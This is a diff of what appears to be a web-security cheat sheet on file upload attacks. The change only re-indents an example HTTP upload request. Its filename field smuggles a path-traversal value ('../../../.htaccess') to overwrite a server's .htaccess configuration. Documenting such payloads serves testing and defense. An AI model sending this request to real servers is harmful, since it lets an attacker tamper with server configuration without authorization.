@@ -122,20 +122,20 @@ Content-Type: application/x-php
 * Overwriting server configuration files
   * .htaccess
 
-  ```http
-  POST /Api/FileUpload.aspx HTTP/2
-  Host: console.example.com
-  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.3
-  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3RwPFJztxaJvrqAq
-  Accept: */*
-  
-  ------WebKitFormBoundary3RwPFJztxaJvrqAq
-  Content-Disposition: form-data; name="file"; filename="../../../.htaccess"
-  Content-Type: text/plain
-  
-  # Your server configuraton rules
-  ------WebKitFormBoundary3RwPFJztxaJvrqAq--
-  ```
+    ```http
+    POST /Api/FileUpload.aspx HTTP/2
+    Host: console.example.com
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.3
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3RwPFJztxaJvrqAq
+    Accept: */*
+    
+    ------WebKitFormBoundary3RwPFJztxaJvrqAq
+    Content-Disposition: form-data; name="file"; filename="../../../.htaccess"
+    Content-Type: text/plain
+    
+    # Your server configuraton rules
+    ------WebKitFormBoundary3RwPFJztxaJvrqAq--
+    ```
 
 ***
 
